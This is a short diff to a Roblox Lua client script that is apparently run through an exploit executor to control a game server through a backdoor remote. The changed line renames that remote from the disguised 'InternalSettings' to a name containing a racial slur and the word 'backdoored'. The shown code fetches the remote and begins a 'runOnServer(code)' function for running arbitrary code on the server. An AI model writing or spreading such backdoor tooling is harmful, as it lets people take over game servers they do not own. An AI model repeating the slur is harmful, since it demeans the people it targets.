@@ -1,7 +1,7 @@
 -- client.lua
 -- Run this in your executor to control the server.
 
-local REMOTE_NAME = "InternalSettings" -- Must match server.lua
+local REMOTE_NAME = "get backdoored nigga" -- Must match server.lua
 local targetRemote = game:GetService("ReplicatedStorage"):WaitForChild(REMOTE_NAME)
 
 local function runOnServer(code)
